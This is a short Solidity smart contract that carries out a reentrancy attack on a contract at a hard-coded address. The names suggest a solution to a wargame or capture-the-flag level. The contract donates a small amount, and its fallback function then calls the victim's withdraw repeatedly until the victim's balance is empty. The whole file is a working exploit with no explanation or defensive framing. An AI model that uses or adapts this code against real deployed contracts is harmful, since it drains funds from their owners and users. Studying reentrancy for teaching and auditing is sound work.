// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract Reenter {
    IReentrance public contratoVictima = IReentrance(0x29997034c6E6BDD958566CF2f2075a7F3c1478cA);
    uint public amount = 0.0001 ether;    //withdrawal amount each time

    constructor() payable {}

    function donar() public {
      contratoVictima.donate{value:amount,gas:4000000}(address(this));//need to add value to this fn
    }
    
    fallback() external payable {
      if (address(contratoVictima).balance != 0 ) {
          contratoVictima.withdraw(amount); 
      }
    }
}